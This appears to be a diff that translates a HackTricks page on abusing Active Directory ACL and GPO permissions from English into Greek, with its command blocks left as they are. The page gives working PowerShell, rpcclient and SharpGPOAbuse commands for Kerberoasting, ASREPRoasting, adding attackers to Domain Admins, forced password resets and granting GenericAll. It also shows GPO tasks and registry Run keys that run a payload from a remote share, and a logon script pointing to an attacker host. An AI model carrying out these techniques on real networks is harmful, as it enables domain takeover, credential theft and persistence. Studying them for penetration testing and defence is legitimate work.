@@ -1,78 +1,65 @@
-# Abusing Active Directory ACLs/ACEs
+# Κατάχρηση ACLs/ACEs του Active Directory
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**This page is mostly a summary of the techniques from** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **and** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. For more details, check the original articles.**
+**Αυτή η σελίδα είναι κυρίως μια σύνοψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, ελέγξτε τα πρωτότυπα άρθρα.**
 
-## **GenericAll Rights on User**
+## **GenericAll Δικαιώματα σε Χρήστη**
 
-This privilege grants an attacker full control over a target user account. Once `GenericAll` rights are confirmed using the `Get-ObjectAcl` command, an attacker can:
+Αυτή η προνόμια παρέχει σε έναν επιτιθέμενο πλήρη έλεγχο πάνω σε έναν λογαριασμό χρήστη-στόχο. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` χρησιμοποιώντας την εντολή `Get-ObjectAcl`, ένας επιτιθέμενος μπορεί να:
 
-- **Change the Target's Password**: Using `net user <username> <password> /domain`, the attacker can reset the user's password.
-- **Targeted Kerberoasting**: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.
-
+- **Αλλάξει τον Κωδικό του Στόχου**: Χρησιμοποιώντας `net user <username> <password> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό του χρήστη.
+- **Στοχευμένο Kerberoasting**: Ανάθεση ενός SPN στον λογαριασμό του χρήστη για να γίνει kerberoastable, στη συνέχεια χρησιμοποιήστε το Rubeus και το targetedKerberoast.py για να εξάγετε και να προσπαθήσετε να σπάσετε τους κατακερματισμούς του εισιτηρίου (TGT).
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-
-- **Targeted ASREPRoasting**: Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.
-
+- **Targeted ASREPRoasting**: Απενεργοποιήστε την προ-αυθεντικοποίηση για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
+## **GenericAll Δικαιώματα σε Ομάδα**
 
-## **GenericAll Rights on Group**
+Αυτό το προνόμιο επιτρέπει σε έναν επιτιθέμενο να χειρίζεται τις συμμετοχές σε ομάδες εάν έχει δικαιώματα `GenericAll` σε μια ομάδα όπως οι `Domain Admins`. Αφού προσδιορίσει το διακριτό όνομα της ομάδας με το `Get-NetGroup`, ο επιτιθέμενος μπορεί να:
 
-This privilege allows an attacker to manipulate group memberships if they have `GenericAll` rights on a group like `Domain Admins`. After identifying the group's distinguished name with `Get-NetGroup`, the attacker can:
-
-- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
-
+- **Προσθέσει τον Εαυτό του στην Ομάδα Domain Admins**: Αυτό μπορεί να γίνει μέσω άμεσων εντολών ή χρησιμοποιώντας modules όπως το Active Directory ή το PowerSploit.
 ```powershell
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
-
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Holding these privileges on a computer object or a user account allows for:
+Η κατοχή αυτών των δικαιωμάτων σε ένα αντικείμενο υπολογιστή ή σε έναν λογαριασμό χρήστη επιτρέπει:
 
-- **Kerberos Resource-based Constrained Delegation**: Enables taking over a computer object.
-- **Shadow Credentials**: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.
+- **Kerberos Resource-based Constrained Delegation**: Ενεργοποιεί την ανάληψη ενός αντικειμένου υπολογιστή.
+- **Shadow Credentials**: Χρησιμοποιήστε αυτή την τεχνική για να προσποιηθείτε έναν υπολογιστή ή λογαριασμό χρήστη εκμεταλλευόμενοι τα δικαιώματα για τη δημιουργία shadow credentials.
 
 ## **WriteProperty on Group**
 
-If a user has `WriteProperty` rights on all objects for a specific group (e.g., `Domain Admins`), they can:
+Εάν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα για μια συγκεκριμένη ομάδα (π.χ., `Domain Admins`), μπορεί να:
 
-- **Add Themselves to the Domain Admins Group**: Achievable via combining `net user` and `Add-NetGroupUser` commands, this method allows privilege escalation within the domain.
-
+- **Add Themselves to the Domain Admins Group**: Εφικτό μέσω του συνδυασμού των εντολών `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει την κλιμάκωση δικαιωμάτων εντός του τομέα.
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-
 ## **Self (Self-Membership) on Group**
 
-This privilege enables attackers to add themselves to specific groups, such as `Domain Admins`, through commands that manipulate group membership directly. Using the following command sequence allows for self-addition:
-
+Αυτή η προνόμια επιτρέπει στους επιτιθέμενους να προσθέτουν τους εαυτούς τους σε συγκεκριμένες ομάδες, όπως οι `Domain Admins`, μέσω εντολών που χειρίζονται άμεσα την ιδιότητα μέλους της ομάδας. Η χρήση της παρακάτω ακολουθίας εντολών επιτρέπει την αυτοπροσθήκη:
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-
 ## **WriteProperty (Self-Membership)**
 
-A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the `WriteProperty` right on those groups. The confirmation and execution of this privilege are performed with:
-
+Ένα παρόμοιο προνόμιο, αυτό επιτρέπει στους επιτιθέμενους να προσθέτουν άμεσα τους εαυτούς τους σε ομάδες τροποποιώντας τις ιδιότητες της ομάδας εάν έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και η εκτέλεση αυτού του προνομίου πραγματοποιούνται με:
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
-
 ## **ForceChangePassword**
 
-Holding the `ExtendedRight` on a user for `User-Force-Change-Password` allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. The commands range from simple PowerShell invocations to using `rpcclient` on Linux, demonstrating the versatility of attack vectors.
-
+Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά κωδικών πρόσβασης χωρίς να γνωρίζετε τον τρέχοντα κωδικό. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας αρκετές μεθόδους για την επαναφορά του κωδικού πρόσβασης ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και one-liners για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως τη χρήση του `rpcclient` σε Linux, επιδεικνύοντας την ευελιξία των επιθέσεων.
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -83,29 +70,23 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
+## **WriteOwner σε Ομάδα**
 
-## **WriteOwner on Group**
-
-If an attacker finds that they have `WriteOwner` rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is `Domain Admins`, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner` to modify the owner, either by SID or name.
-
+Αν ένας επιτιθέμενος διαπιστώσει ότι έχει δικαιώματα `WriteOwner` σε μια ομάδα, μπορεί να αλλάξει την ιδιοκτησία της ομάδας σε τον εαυτό του. Αυτό είναι ιδιαίτερα σημαντικό όταν η ομάδα που εξετάζεται είναι οι `Domain Admins`, καθώς η αλλαγή ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο πάνω σε χαρακτηριστικά και μέλη της ομάδας. Η διαδικασία περιλαμβάνει την αναγνώριση του σωστού αντικειμένου μέσω `Get-ObjectAcl` και στη συνέχεια τη χρήση του `Set-DomainObjectOwner` για να τροποποιήσει τον ιδιοκτήτη, είτε μέσω SID είτε μέσω ονόματος.
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-
 ## **GenericWrite on User**
 
-This permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script.
-
+Αυτή η άδεια επιτρέπει σε έναν επιτιθέμενο να τροποποιήσει τις ιδιότητες του χρήστη. Συγκεκριμένα, με την πρόσβαση `GenericWrite`, ο επιτιθέμενος μπορεί να αλλάξει τη διαδρομή του script σύνδεσης ενός χρήστη για να εκτελέσει ένα κακόβουλο script κατά την είσοδο του χρήστη. Αυτό επιτυγχάνεται χρησιμοποιώντας την εντολή `Set-ADObject` για να ενημερώσει την ιδιότητα `scriptpath` του στοχευόμενου χρήστη ώστε να δείχνει στο script του επιτιθέμενου.
 ```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-
 ## **GenericWrite on Group**
 
-With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.
-
+Με αυτό το δικαίωμα, οι επιτιθέμενοι μπορούν να χειρίζονται τη συμμετοχή σε ομάδες, όπως το να προσθέτουν τους εαυτούς τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός αντικειμένου διαπιστευτηρίων, τη χρήση του για την προσθήκη ή την αφαίρεση χρηστών από μια ομάδα και την επαλήθευση των αλλαγών συμμετοχής με εντολές PowerShell.
 ```powershell
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -113,11 +94,9 @@ Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'userna
 Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
-
 ## **WriteDACL + WriteOwner**
 
-Owning an AD object and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.
-
+Η κατοχή ενός αντικειμένου AD και η ύπαρξη δικαιωμάτων `WriteDACL` σε αυτό επιτρέπει σε έναν επιτιθέμενο να παραχωρήσει στον εαυτό του δικαιώματα `GenericAll` πάνω στο αντικείμενο. Αυτό επιτυγχάνεται μέσω της χειρισμού ADSI, επιτρέποντας πλήρη έλεγχο πάνω στο αντικείμενο και τη δυνατότητα τροποποίησης των μελών της ομάδας του. Παρά ταύτα, υπάρχουν περιορισμοί όταν προσπαθεί κανείς να εκμεταλλευτεί αυτά τα δικαιώματα χρησιμοποιώντας τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -125,71 +104,64 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
+## **Αναπαραγωγή στον Τομέα (DCSync)**
 
-## **Replication on the Domain (DCSync)**
+Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένα δικαιώματα αναπαραγωγής στον τομέα για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί δικαιώματα όπως το `DS-Replication-Get-Changes`, επιτρέποντας στους επιτιθέμενους να εξάγουν ευαίσθητες πληροφορίες από το περιβάλλον AD χωρίς άμεση πρόσβαση σε έναν Domain Controller. [**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)
 
-The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)
+## Ανάθεση GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
+### Ανάθεση GPO
 
-### GPO Delegation
+Η ανατεθείσα πρόσβαση για τη διαχείριση των Αντικειμένων Πολιτικής Ομάδας (GPOs) μπορεί να παρουσιάσει σημαντικούς κινδύνους ασφαλείας. Για παράδειγμα, εάν ένας χρήστης όπως ο `offense\spotless` έχει ανατεθεί δικαιώματα διαχείρισης GPO, μπορεί να έχει προνόμια όπως **WriteProperty**, **WriteDacl** και **WriteOwner**. Αυτά τα δικαιώματα μπορούν να εκμεταλλευτούν για κακόβουλους σκοπούς, όπως προσδιορίζεται χρησιμοποιώντας το PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+### Καταμέτρηση Δικαιωμάτων GPO
 
-### Enumerate GPO Permissions
+Για να προσδιοριστούν οι κακώς ρυθμισμένες GPO, τα cmdlets του PowerSploit μπορούν να συνδυαστούν. Αυτό επιτρέπει την ανακάλυψη GPO που έχει δικαιώματα διαχείρισης από έναν συγκεκριμένο χρήστη: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+**Υπολογιστές με Εφαρμοσμένη Μια Δοθείσα Πολιτική**: Είναι δυνατόν να προσδιοριστεί ποιοι υπολογιστές επηρεάζονται από μια συγκεκριμένη GPO, βοηθώντας στην κατανόηση της έκτασης της πιθανής επίδρασης. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**Computers with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Πολιτικές Εφαρμοσμένες σε Έναν Δοθέντα Υπολογιστή**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως το `Get-DomainGPO`.
 
-**Policies Applied to a Given Computer**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.
+**OUs με Εφαρμοσμένη Μια Δοθείσα Πολιτική**: Ο προσδιορισμός των οργανωτικών μονάδων (OUs) που επηρεάζονται από μια δεδομένη πολιτική μπορεί να γίνει χρησιμοποιώντας το `Get-DomainOU`.
 
-**OUs with a Given Policy Applied**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.
+### Κατάχρηση GPO - New-GPOImmediateTask
 
-### Abuse GPO - New-GPOImmediateTask
-
-Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:
-
+Οι κακώς ρυθμισμένες GPO μπορούν να εκμεταλλευτούν για την εκτέλεση κώδικα, για παράδειγμα, δημιουργώντας μια άμεση προγραμματισμένη εργασία. Αυτό μπορεί να γίνει για να προστεθεί ένας χρήστης στην τοπική ομάδα διαχειριστών στους επηρεαζόμενους υπολογιστές, σημαντικά αυξάνοντας τα προνόμια:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-
 ### GroupPolicy module - Abuse GPO
 
-The GroupPolicy module, if installed, allows for the creation and linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This method requires the GPO to be updated and a user to log in to the computer for execution:
-
+Το module GroupPolicy, αν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και σύνδεση νέων GPO, καθώς και την ρύθμιση προτιμήσεων όπως οι τιμές μητρώου για την εκτέλεση backdoors στους επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί την ενημέρωση του GPO και έναν χρήστη να συνδεθεί στον υπολογιστή για την εκτέλεση:
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
+### SharpGPOAbuse - Κατάχρηση GPO
 
-### SharpGPOAbuse - Abuse GPO
-
-SharpGPOAbuse offers a method to abuse existing GPOs by adding tasks or modifying settings without the need to create new GPOs. This tool requires modification of existing GPOs or using RSAT tools to create new ones before applying changes:
-
+Το SharpGPOAbuse προσφέρει μια μέθοδο για την κατάχρηση υπαρχόντων GPOs προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί τροποποίηση των υπαρχόντων GPOs ή τη χρήση εργαλείων RSAT για τη δημιουργία νέων πριν από την εφαρμογή αλλαγών:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
+### Εξαναγκασμένη Ενημέρωση Πολιτικής
 
-### Force Policy Update
+Οι ενημερώσεις GPO συνήθως συμβαίνουν κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορεί να χρησιμοποιηθεί η εντολή `gpupdate /force` στον στόχο υπολογιστή για να εξαναγκαστεί μια άμεση ενημέρωση πολιτικής. Αυτή η εντολή διασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPO εφαρμόζονται χωρίς να περιμένουν τον επόμενο αυτόματο κύκλο ενημέρωσης.
 
-GPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.
+### Κάτω από την Επιφάνεια
 
-### Under the Hood
+Κατά την επιθεώρηση των Προγραμματισμένων Εργασιών για ένα συγκεκριμένο GPO, όπως η `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως η `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω σεναρίων ή εργαλείων γραμμής εντολών που στοχεύουν στην τροποποίηση της συμπεριφοράς του συστήματος ή στην κλιμάκωση των δικαιωμάτων.
 
-Upon inspection of the Scheduled Tasks for a given GPO, like the `Misconfigured Policy`, the addition of tasks such as `evilTask` can be confirmed. These tasks are created through scripts or command-line tools aiming to modify system behavior or escalate privileges.
+Η δομή της εργασίας, όπως φαίνεται στο αρχείο διαμόρφωσης XML που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες της προγραμματισμένης εργασίας - συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των ενεργοποιητών της. Αυτό το αρχείο αντιπροσωπεύει τον τρόπο με τον οποίο ορίζονται και διαχειρίζονται οι προγραμματισμένες εργασίες εντός των GPO, παρέχοντας μια μέθοδο για την εκτέλεση αυθαίρετων εντολών ή σεναρίων ως μέρος της επιβολής πολιτικής.
 
-The structure of the task, as shown in the XML configuration file generated by `New-GPOImmediateTask`, outlines the specifics of the scheduled task - including the command to be executed and its triggers. This file represents how scheduled tasks are defined and managed within GPOs, providing a method for executing arbitrary commands or scripts as part of policy enforcement.
+### Χρήστες και Ομάδες
 
-### Users and Groups
+Τα GPO επιτρέπουν επίσης την παραποίηση των μελών χρηστών και ομάδων στα συστήματα στόχους. Με την επεξεργασία των αρχείων πολιτικής Χρηστών και Ομάδων απευθείας, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως η τοπική ομάδα `administrators`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, που επιτρέπει την τροποποίηση των αρχείων πολιτικής για να περιλαμβάνουν νέους χρήστες ή να αλλάζουν τις συμμετοχές ομάδων.
 
-GPOs also allow for the manipulation of user and group memberships on target systems. By editing the Users and Groups policy files directly, attackers can add users to privileged groups, such as the local `administrators` group. This is possible through the delegation of GPO management permissions, which permits the modification of policy files to include new users or change group memberships.
+Το αρχείο διαμόρφωσης XML για Χρήστες και Ομάδες περιγράφει πώς εφαρμόζονται αυτές οι αλλαγές. Προσθέτοντας εγγραφές σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να αποκτήσουν ανυψωμένα δικαιώματα σε επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση στην κλιμάκωση δικαιωμάτων μέσω της παραποίησης GPO.
 
-The XML configuration file for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through GPO manipulation.
+Επιπλέον, μπορούν να εξεταστούν πρόσθετες μέθοδοι για την εκτέλεση κώδικα ή τη διατήρηση της επιμονής, όπως η εκμετάλλευση σεναρίων σύνδεσης/αποσύνδεσης, η τροποποίηση κλειδιών μητρώου για autoruns, η εγκατάσταση λογισμικού μέσω αρχείων .msi ή η επεξεργασία ρυθμίσεων υπηρεσιών. Αυτές οι τεχνικές παρέχουν διάφορες οδούς για τη διατήρηση της πρόσβασης και τον έλεγχο των συστημάτων στόχων μέσω της κακοποίησης των GPO.
 
-Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.
-
-## References
+## Αναφορές
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
@@ -200,4 +172,3 @@ Furthermore, additional methods for executing code or maintaining persistence, s
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
 
 {{#include ../../../banners/hacktricks-training.md}}
-
